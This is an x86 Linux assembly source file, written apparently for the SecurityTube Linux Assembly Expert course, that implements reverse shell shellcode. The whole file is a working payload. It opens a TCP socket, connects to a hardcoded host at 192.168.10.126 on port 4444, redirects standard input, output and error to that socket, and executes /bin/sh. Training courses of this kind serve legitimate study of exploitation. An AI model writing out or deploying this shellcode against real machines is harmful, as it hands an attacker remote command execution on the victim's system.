; Linux/x86 reverse shell shellcode
; By Daniel Roberson -- @dmfroberson -- daniel@planethacker.net
; 
; For SecurityTube Linux Assembly Expert course.
; SLAE-877

BITS 32


; python -c "import socket; print hex(socket.htons(4444))"
PORT equ 0x5c11

; python -c 'import socket,struct; print hex(struct.unpack("<L", socket.inet_aton("192.168.10.126"))[0])'
HOST equ 0x7e0aa8c0

xor eax, eax              ; zero out eax
xor ebx, ebx              ; zero out ebx
xor edx, edx              ; zero out edx

add eax, 102              ; socketcall()
inc ebx                   ; socket() -- 1
push edx                  ; IPPROTO_IP -- 0
push 1                    ; SOCK_STREAM
push dword 2              ; AF_INET
mov ecx, esp              ; address of args
int 0x80                  ; call socket()

xchg esi, eax             ; fd for socket

xor eax, eax              ; zero out eax
add eax, 102              ; socketcall()
inc ebx                   ; increase ebx to 2
inc ebx                   ; connect() -- 3
push HOST                 ; IP in network byte order
push word PORT            ; port in network byte order
push word 2               ; AF_INET
mov ecx, esp              ; address of structure
push 16                   ; size of structure
push ecx                  ; address of structure
push esi                  ; socket descriptor
mov ecx, esp              ; save address
int 0x80                  ; call connect()

;; dup2 loop
xor ecx, ecx              ; zero out ecx
mov cl, 2                 ; initialize counter
loop:
    xor eax, eax
    add eax, 63           ; dup2()
    int 0x80
    dec ecx               ; decrease counter
    jns loop              ; jump to loop if applicable

xor eax, eax              ; zero out eax
push eax                  ; push null byte
push 0x68732f2f           ; //sh
push 0x6e69622f           ; /bin
mov ebx, esp              ; copy address of string
push eax                  ; null
push ebx                  ; address of /bin/sh 
mov ecx, esp              ;
push eax                  ; null
mov edx, esp              ; envp
mov al, 11                ; execve()
int 0x80                  ; call execve()

